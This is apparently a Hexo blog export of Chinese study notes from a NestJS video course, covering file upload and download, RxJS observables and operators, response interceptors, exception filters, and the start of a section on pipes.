<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">Controller</span>,</span><br><span class="line">  <span class="title class_">Post</span>,</span><br><span class="line">  <span class="title class_">UseInterceptors</span>,</span><br><span class="line">  <span class="title class_">UploadedFile</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UploadService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./upload.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CreateUploadDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/create-upload.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UpdateUploadDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/update-upload.dto&#x27;</span>;</span><br><span class="line"><span class="comment">// 上传单个文件的中间件、上传多个文件的中间件</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">FileInterceptor</span>, <span class="title class_">FilesInterceptor</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/platform-express&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">UploadController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> uploadService: UploadService</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 上传文件</span></span><br><span class="line">  <span class="meta">@Post</span>(<span class="string">&#x27;album&#x27;</span>)</span><br><span class="line">  <span class="comment">// 指定处理中间件，使用上传单个文件的中间件</span></span><br><span class="line">  <span class="meta">@UseInterceptors</span>(<span class="title class_">FileInterceptor</span>(<span class="string">&#x27;file&#x27;</span>))</span><br><span class="line">  <span class="comment">// 使用@UploadedFile接收file</span></span><br><span class="line">  <span class="title function_">upload</span>(<span class="params"><span class="meta">@UploadedFile</span>() file</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(file, <span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;omg&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="静态资源目录"><a href="#静态资源目录" class="headerlink" title="静态资源目录"></a>静态资源目录</h2><p>在main.ts中指定：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestFactory</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VersioningType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestExpressApplication</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/platform-express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; join &#125; <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bootstrap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> <span class="title class_">NestFactory</span>.<span class="property">create</span>&lt;<span class="title class_">NestExpressApplication</span>&gt;(<span class="title class_">AppModule</span>);</span><br><span class="line">  app.<span class="title function_">enableVersioning</span>(&#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">VersioningType</span>.<span class="property">URI</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 配置静态资源目录</span></span><br><span class="line">  app.<span class="title function_">useStaticAssets</span>(<span class="title function_">join</span>(__dirname, <span class="string">&#x27;images&#x27;</span>), &#123;</span><br><span class="line">    <span class="comment">// 配置自定义路径前缀</span></span><br><span class="line">    <span class="attr">prefix</span>: <span class="string">&#x27;/images&#x27;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bootstrap</span>();</span><br></pre></td></tr></table></figure>

<h1 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h1><h2 id="Download下载"><a href="#Download下载" class="headerlink" title="Download下载"></a>Download下载</h2><p>在controller中编写：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// download下载方式</span></span><br><span class="line"><span class="meta">@Get</span>(<span class="string">&#x27;export&#x27;</span>)</span><br><span class="line"><span class="title function_">download</span>(<span class="params"><span class="meta">@Res</span>() res: Response</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="title function_">join</span>(__dirname, <span class="string">&#x27;../images/1690969695525.png&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">download</span>(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="文件流下载"><a href="#文件流下载" class="headerlink" title="文件流下载"></a>文件流下载</h2><h3 id="后端提供文件流"><a href="#后端提供文件流" class="headerlink" title="后端提供文件流"></a>后端提供文件流</h3><p>安装压缩文件的依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install compressing -s</span><br></pre></td></tr></table></figure>

<p>在controller中编写：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 流下载方式</span></span><br><span class="line"><span class="meta">@Get</span>(<span class="string">&#x27;stream&#x27;</span>)</span><br><span class="line"><span class="keyword">async</span> <span class="title function_">down</span>(<span class="params"><span class="meta">@Res</span>() res: Response</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="title function_">join</span>(__dirname, <span class="string">&#x27;../images/1690969695525.png&#x27;</span>);</span><br><span class="line">  <span class="comment">// 压缩文件</span></span><br><span class="line">  <span class="keyword">const</span> tarStream = <span class="keyword">new</span> zip.<span class="title class_">Stream</span>();</span><br><span class="line">  <span class="keyword">await</span> tarStream.<span class="title function_">addEntry</span>(url);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> filename = url.<span class="title function_">substring</span>(url.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置请求头</span></span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Disposition&#x27;</span>, <span class="string">`attachment; filename=<span class="subst">$&#123;filename&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 变成二进制流文件</span></span><br><span class="line">  tarStream.<span class="title function_">pipe</span>(res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="前端接收文件流"><a href="#前端接收文件流" class="headerlink" title="前端接收文件流"></a>前端接收文件流</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;download&quot;&gt;</span><br><span class="line">    下载</span><br><span class="line">  &lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">const download = ()=&gt; &#123;</span><br><span class="line">  // 这样也可以</span><br><span class="line">  // window.open(&#x27;http://localhost:3000/upload/stream&#x27;)</span><br><span class="line">  // 但是这样更安全</span><br><span class="line">  useFetch(&#x27;http://localhost:3000/upload/stream&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 前端接收流文件</span><br><span class="line">// axios也一样，需要使用ArrayBuffer和Blob</span><br><span class="line">const useFetch = async (url: string)=&gt; &#123;</span><br><span class="line">  const res = await fetch(url).then(res=&gt; res.arrayBuffer())</span><br><span class="line">  console.log(res,&#x27;res&#x27;)</span><br><span class="line">  const blob = new Blob([res])</span><br><span class="line">  console.log(blob,&#x27;blob&#x27;)</span><br><span class="line">  const urll = URL.createObjectURL(blob)</span><br><span class="line">  console.log(urll,&#x27;urll&#x27;)</span><br><span class="line">  const a = document.createElement(&#x27;a&#x27;)</span><br><span class="line">  a.href = urll</span><br><span class="line">  a.download = &#x27;omg.zip&#x27;</span><br><span class="line">  a.click()</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>Nestjs和Rxjs</title>
    <url>/web/study/Nestjs/11.Nestjs%E5%92%8CRxjs.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="Rxjs"><a href="#Rxjs" class="headerlink" title="Rxjs"></a>Rxjs</h1><p>Rxjs使用观察者模式，用于编写异步队列和事件处理</p>
<blockquote>
<p>后端不需要处理前端事件，所以Nestjs主要使用Rxjs的异步队列功能</p>
</blockquote>
<p>Rxjs的核心组成成分：</p>
<ul>
<li>Observable：可观察的物件</li>
<li>Subscription：用于监听Observable</li>
<li>Operators：纯函数，可以处理管道的数据，如map、filter、concat、reduce等</li>
</ul>
<p>Nestjs中内置Rxjs，无需安装，并且Nestjs也有一些基于Rxjs封装的API</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="keyword">of</span>, <span class="title class_">Observable</span>, interval, take &#125; <span class="keyword">from</span> <span class="string">&quot;rxjs&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; map, filter, findIndex, reduce &#125; <span class="keyword">from</span> <span class="string">&quot;rxjs/operators&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Observable，被观察的物件</span></span><br><span class="line"><span class="keyword">const</span> observable = <span class="keyword">new</span> <span class="title class_">Observable</span>(<span class="function">(<span class="params">subscribe</span>)=&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 发送消息</span></span><br><span class="line">  subscribe.<span class="title function_">next</span>(<span class="number">114</span>)</span><br><span class="line">  subscribe.<span class="title function_">next</span>(<span class="number">514</span>)</span><br><span class="line">  subscribe.<span class="title function_">next</span>(<span class="number">1919</span>)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    subscribe.<span class="title function_">next</span>(<span class="number">810</span>)</span><br><span class="line">    <span class="comment">// 通知结束消息发送</span></span><br><span class="line">    subscribe.<span class="title function_">complete</span>()</span><br><span class="line">  &#125;, <span class="number">3000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Subscription，监听Observable</span></span><br><span class="line">observable.<span class="title function_">subscribe</span>(&#123;</span><br><span class="line">  <span class="comment">// 接收消息</span></span><br><span class="line">  <span class="attr">next</span>: <span class="function">(<span class="params">num</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(num)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>interval也是一种Observable，可以按时间间隔发送消息：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从0开始每隔500ms输出一个下一个整数，直到5为止（5不被输出）</span></span><br><span class="line"><span class="comment">// interval:间隔时间  pipe:管道  take:停止输出的条件  subscribe:输出的观察者</span></span><br><span class="line"><span class="comment">// interval(500).pipe(take(5)).subscribe(e=&gt; &#123;</span></span><br><span class="line"><span class="comment">//   console.log(e)</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// map和take类似，但是每个整数会被转为这样的对象</span></span><br><span class="line"><span class="comment">// const subs = interval(500).pipe(map(v=&gt;(&#123;n:v&#125;))).subscribe(e=&gt; &#123;</span></span><br><span class="line"><span class="comment">//   console.log(e)</span></span><br><span class="line"><span class="comment">//   if(e.n === 10) &#123;</span></span><br><span class="line"><span class="comment">//     // 停止观察，10会被输出</span></span><br><span class="line"><span class="comment">//     subs.unsubscribe()</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pipe内可以使用多个Operator</span></span><br><span class="line"><span class="keyword">const</span> subs = <span class="title function_">interval</span>(<span class="number">500</span>).<span class="title function_">pipe</span>(<span class="title function_">map</span>(<span class="function"><span class="params">v</span>=&gt;</span>(&#123;<span class="attr">n</span>:v&#125;)),<span class="title function_">filter</span>(<span class="function"><span class="params">v</span>=&gt;</span>v.<span class="property">n</span>%<span class="number">2</span>===<span class="number">0</span>)).<span class="title function_">subscribe</span>(<span class="function"><span class="params">e</span>=&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">  <span class="keyword">if</span>(e.<span class="property">n</span> === <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="comment">// 停止观察，10会被输出</span></span><br><span class="line">    subs.<span class="title function_">unsubscribe</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>of也是一种Observable，可以自定义填充数据：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据被规定为1,2,3,4,5,6</span></span><br><span class="line"><span class="keyword">const</span> subs = <span class="title function_">of</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>).<span class="title function_">pipe</span>(<span class="title function_">map</span>(<span class="function"><span class="params">v</span>=&gt;</span>(&#123;<span class="attr">n</span>:v&#125;)),<span class="title function_">filter</span>(<span class="function"><span class="params">v</span>=&gt;</span>v.<span class="property">n</span>%<span class="number">2</span>===<span class="number">0</span>)).<span class="title function_">subscribe</span>(<span class="function"><span class="params">e</span>=&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当操作出错时，retry会重试，重试几次取决于传的参数</span></span><br><span class="line"><span class="keyword">const</span> subs = <span class="title function_">of</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>).<span class="title function_">pipe</span>(<span class="title function_">retry</span>(<span class="number">3</span>), <span class="title function_">map</span>(<span class="function"><span class="params">v</span>=&gt;</span>(&#123;<span class="attr">n</span>:v&#125;))).<span class="title function_">subscribe</span>(<span class="function"><span class="params">e</span>=&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>也可以处理DOM事件：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> click$ = <span class="title function_">fromEvent</span>(<span class="variable language_">document</span>, <span class="string">&#x27;click&#x27;</span>).<span class="title function_">pipe</span>(<span class="title function_">map</span>(<span class="function"><span class="params">v</span>=&gt;</span>v.<span class="property">target</span>))</span><br><span class="line"></span><br><span class="line">click$.<span class="title function_">subscribe</span>(<span class="function"><span class="params">e</span>=&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>拦截器</title>
    <url>/web/study/Nestjs/12.%E6%8B%A6%E6%88%AA%E5%99%A8.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h1><p>拦截器具有一系列有用的功能，这些功能受面向切面编程(AOP)技术的启发,它们可以：</p>
<ul>
<li>在函数执行之前&#x2F;之后绑定额外的逻辑</li>
<li>转换从函数返回的结果</li>
<li>转换从函数抛出的异常</li>
<li>扩展基本函数行为</li>
<li>根据所选条件完全重写函数，例如缓存目的</li>
</ul>
<h1 id="响应拦截器"><a href="#响应拦截器" class="headerlink" title="响应拦截器"></a>响应拦截器</h1><p>场景：使后端返回一个标准的json格式，方便前端进行逻辑判断，这需要给数据做一个全局format</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  data, //数据</span><br><span class="line">  status:0,</span><br><span class="line">  message:&quot;成功&quot;,</span><br><span class="line">  success:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写拦截器common&#x2F;response.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">Injectable</span>,</span><br><span class="line">  <span class="title class_">NestInterceptor</span>,</span><br><span class="line">  <span class="title class_">CallHandler</span>,</span><br><span class="line">  <span class="title class_">ExecutionContext</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; map &#125; <span class="keyword">from</span> <span class="string">&#x27;rxjs/operators&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Observable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;rxjs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Data</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="attr">data</span>: T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Response</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">NestInterceptor</span> &#123;</span><br><span class="line">  <span class="title function_">intercept</span>(</span><br><span class="line">    <span class="attr">context</span>: <span class="title class_">ExecutionContext</span>,</span><br><span class="line">    <span class="attr">next</span>: <span class="title class_">CallHandler</span>&lt;<span class="built_in">any</span>&gt;,</span><br><span class="line">  ): <span class="title class_">Observable</span>&lt;<span class="title class_">Data</span>&lt;T&gt;&gt; | <span class="title class_">Promise</span>&lt;<span class="title class_">Observable</span>&lt;<span class="title class_">Data</span>&lt;T&gt;&gt;&gt; &#123;</span><br><span class="line">    <span class="comment">// Nestjs配合Rxjs格式化数据</span></span><br><span class="line">    <span class="keyword">return</span> next.<span class="title function_">handle</span>().<span class="title function_">pipe</span>(</span><br><span class="line">      <span class="title function_">map</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          data,</span><br><span class="line">          <span class="attr">status</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">message</span>: <span class="string">&#x27;成功&#x27;</span>,</span><br><span class="line">          <span class="attr">success</span>: <span class="literal">true</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;),</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在main.ts注册拦截器：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestFactory</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VersioningType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestExpressApplication</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/platform-express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Response</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./common/response&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bootstrap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> <span class="title class_">NestFactory</span>.<span class="property">create</span>&lt;<span class="title class_">NestExpressApplication</span>&gt;(<span class="title class_">AppModule</span>, &#123;</span><br><span class="line">    <span class="attr">cors</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  app.<span class="title function_">enableVersioning</span>(&#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">VersioningType</span>.<span class="property">URI</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 注册拦截器</span></span><br><span class="line">  app.<span class="title function_">useGlobalInterceptors</span>(<span class="keyword">new</span> <span class="title class_">Response</span>());</span><br><span class="line">  <span class="keyword">await</span> app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bootstrap</span>();</span><br></pre></td></tr></table></figure>

<p>接口数据成功被格式化了：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308041440230.png"></p>
<h1 id="异常过滤器"><a href="#异常过滤器" class="headerlink" title="异常过滤器"></a>异常过滤器</h1><p>场景：后端的接口相关异常需要集中捕获，并返回错误信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  success: false,</span><br><span class="line">  time: new Date(),</span><br><span class="line">  data: exception.message,</span><br><span class="line">  status,</span><br><span class="line">  path: request.url,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写过滤器common&#x2F;filter.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">ExceptionFilter</span>,</span><br><span class="line">  <span class="title class_">Catch</span>,</span><br><span class="line">  <span class="title class_">ArgumentsHost</span>,</span><br><span class="line">  <span class="title class_">HttpException</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Request</span>, <span class="title class_">Response</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 捕获异常需要用@Catch装饰器</span></span><br><span class="line"><span class="comment">// 可以给@Catch指定异常的类型</span></span><br><span class="line"><span class="meta">@Catch</span>(<span class="title class_">HttpException</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">HttpFilter</span> <span class="keyword">implements</span> <span class="title class_">ExceptionFilter</span> &#123;</span><br><span class="line">  <span class="keyword">catch</span>(<span class="attr">exception</span>: <span class="title class_">HttpException</span>, <span class="attr">host</span>: <span class="title class_">ArgumentsHost</span>) &#123;</span><br><span class="line">    <span class="comment">// 获取http上下文</span></span><br><span class="line">    <span class="keyword">const</span> ctx = host.<span class="title function_">switchToHttp</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> request = ctx.<span class="property">getRequest</span>&lt;<span class="title class_">Request</span>&gt;();</span><br><span class="line">    <span class="keyword">const</span> response = ctx.<span class="property">getResponse</span>&lt;<span class="title class_">Response</span>&gt;();</span><br><span class="line">    <span class="keyword">const</span> status = exception.<span class="title function_">getStatus</span>();</span><br><span class="line">    <span class="comment">// 返回错误信息</span></span><br><span class="line">    response.<span class="title function_">status</span>(status).<span class="title function_">json</span>(&#123;</span><br><span class="line">      <span class="attr">success</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">time</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(),</span><br><span class="line">      <span class="attr">data</span>: exception,</span><br><span class="line">      status,</span><br><span class="line">      <span class="attr">path</span>: request.<span class="property">url</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在main.ts注册过滤器：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestFactory</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VersioningType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestExpressApplication</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/platform-express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; join &#125; <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">HttpFilter</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./common/filter&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bootstrap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> <span class="title class_">NestFactory</span>.<span class="property">create</span>&lt;<span class="title class_">NestExpressApplication</span>&gt;(<span class="title class_">AppModule</span>, &#123;</span><br><span class="line">    <span class="attr">cors</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  app.<span class="title function_">enableVersioning</span>(&#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">VersioningType</span>.<span class="property">URI</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 注册过滤器</span></span><br><span class="line">  app.<span class="title function_">useGlobalFilters</span>(<span class="keyword">new</span> <span class="title class_">HttpFilter</span>());</span><br><span class="line">  <span class="keyword">await</span> app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bootstrap</span>();</span><br></pre></td></tr></table></figure>

<p>异常信息成功被返回了：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308041747162.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>管道</title>
    <url>/web/study/Nestjs/13.%E7%AE%A1%E9%81%93.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308041816781.png"></p>
<p>管道可以做两件事：</p>
<ol>
<li>转换，将前端传入的数据转成成需要的数据</li>
<li>验证，类似于前端的rules配置验证规则</li>
</ol>
<h1 id="管道转换"><a href="#管道转换" class="headerlink" title="管道转换"></a>管道转换</h1><p>Nestjs提供了八个内置转换API</p>
<ul>
<li>ValidationPipe</li>
<li>ParseIntPipe</li>
<li>ParseFloatPipe</li>
<li>ParseBoolPipe</li>
<li>ParseArrayPipe</li>
<li>ParseUUIDPipe</li>
<li>ParseEnumPipe</li>
<li>DefaultValuePipe</li>
</ul>
<p>可以根据需要将前端传来的数据转换成合适的类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">Controller</span>,</span><br><span class="line">  <span class="title class_">Get</span>,</span><br><span class="line">  <span class="title class_">Param</span>,</span><br><span class="line">  <span class="title class_">ParseIntPipe</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">PService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./p.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CreatePDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/create-p.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UpdatePDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/update-p.dto&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span 